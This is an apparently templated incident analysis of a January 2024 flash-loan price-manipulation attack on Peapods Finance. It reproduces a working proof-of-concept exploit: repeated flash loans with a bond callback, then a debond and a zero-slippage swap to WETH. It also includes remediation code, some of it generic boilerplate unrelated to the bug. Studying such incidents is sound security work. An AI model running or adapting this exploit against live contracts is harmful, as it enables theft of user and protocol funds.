# Peapods Finance — Analysis of Podded Token Price Manipulation via Flash Loan

| Field | Details |
|------|------|
| **Date** | 2024-01-27 |
| **Protocol** | Peapods Finance |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Podded token price calculation relies on AMM spot reserves, allowing reserve manipulation within a single block to distort prices and realize arbitrage profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/PeapodsFinance_exp.sol) |

---
## 1. Vulnerability Overview

Peapods Finance is a DeFi protocol operating on the Ethereum chain that was subjected to a **flash loan / price manipulation** attack on 2024-01-27.
The attacker exploited podded token price manipulation via flash loans, causing approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Flash Loan / Price Manipulation
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Price Manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Problem: Podded token price manipulation via flash loan
// The attacker exploits this logic to obtain illegitimate profits

// IppPP (Peapods) interface — flash loan price manipulation vulnerable functions
interface IppPP {
    // ❌ Vulnerable: bond/debond can be called within the flash callback
    // Borrow large amounts via flash loan, bond to manipulate price, then profit via debond
    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;

    // ❌ Vulnerable: bonding price calculated based on instantaneous balance
    function bond(address _token, uint256 _amount) external;
    function debond(uint256 _amount, address[] memory tokens, uint8[] memory percentage) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }
    // ❌ Vulnerable: amountOutMinimum=0 allows unlimited losses from price manipulation
    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}

// ✅ Correct implementation: disable bond/debond during flash loans
function safeBond(address _token, uint256 _amount) external {
    // ✅ Block bond calls while a flash loan is active
    require(!flashLoanActive, "Flash: bond blocked during flash loan");
    // ✅ Use TWAP for price calculation (instead of instantaneous balance)
    uint256 bondPrice = getTWAPBondPrice(_token);
    require(bondPrice > 0, "Invalid bond price");
    IERC20(_token).transferFrom(msg.sender, address(this), _amount);
    // Actual bonding logic
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── Ethereum DEX/Lending
  │                        (borrow large amount of tokens)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                               (alter internal state)
  ▼
[Illegitimate Profit Extraction] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - PeapodsFinance_exp.sol
// Chain: Ethereum | Date: 2024-01-27

    function testExploit() public {
        deal(address(DAI), address(this), 200e18);
        emit log_named_decimal_uint("Exploiter DAI balance before attack", DAI.balanceOf(address(this)), DAI.decimals());

        uint8 i;
        while (i < 20) {
            DAI.approve(address(ppPP), 10e18);
            ppPP.flash(address(this), address(Peas), Peas.balanceOf(address(ppPP)), "");
            ++i;
        }

        address[] memory token = new address[](1);
        token[0] = address(Peas);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;
        ppPP.debond(ppPP.balanceOf(address(this)), token, percentage);
        PeasToWETH();
        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function callback(
        bytes calldata data
    ) external {
        Peas.approve(address(ppPP), Peas.balanceOf(address(this)));
        ppPP.bond(address(Peas), Peas.balanceOf(address(this)));
    }

    function PeasToWETH() internal {
        Peas.approve(address(Router), type(uint256).max);
        bytes memory _path = abi.encodePacked(address(Peas), hex"002710", address(DAI), hex"0001f4", address(WETH));
        IUniswapV3Router.ExactInputParams memory params = IUniswapV3Router.ExactInputParams({
            path: _path,
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: Peas.balanceOf(address(this)),
            amountOutMinimum: 0
        });
        Router.exactInput(params);
    }
}

```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Price Manipulation |
| **Attack Type** | Flash Loan Attack |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | High (flash loan required) |
| **Prerequisites** | Sufficient gas fees and flash loan access |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the attacked functions
2. **Assess damage**: Quantify lost assets and classify affected users
3. **Notify relevant parties**: Immediately alert related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 auditing firms)
- Run a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Flash loan / price manipulation attacks are preventable**: Defensible through proper validation and pattern application
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-01-27** Peapods Finance incident reconfirms the danger of **flash loan / price manipulation** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Stronger community-level security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC original: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/PeapodsFinance_exp.sol)*